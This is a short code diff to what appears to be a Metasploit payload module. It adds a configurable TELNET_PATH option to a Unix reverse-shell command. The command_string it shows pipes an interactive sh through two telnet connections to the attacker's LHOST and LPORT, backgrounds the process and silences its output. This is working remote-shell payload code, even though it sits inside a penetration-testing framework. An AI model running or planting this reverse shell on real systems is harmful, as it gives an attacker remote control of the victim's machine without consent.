@@ -29,6 +29,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('TELNET_PATH', [true, 'The path to Telnet', 'telnet'])
+    ])
   end
 
   #
@@ -45,9 +48,9 @@ module MetasploitModule
   def command_string
     cmd =
       "sh -c '(sleep #{3600+rand(1024)}|" +
-      "telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
+      "#{datastore['TELNET_PATH']} #{datastore['LHOST']} #{datastore['LPORT']}|" +
       "while : ; do sh && break; done 2>&1|" +
-      "telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
+      "#{datastore['TELNET_PATH']} #{datastore['LHOST']} #{datastore['LPORT']}" +
       " >/dev/null 2>&1 &)'"
     return cmd
   end
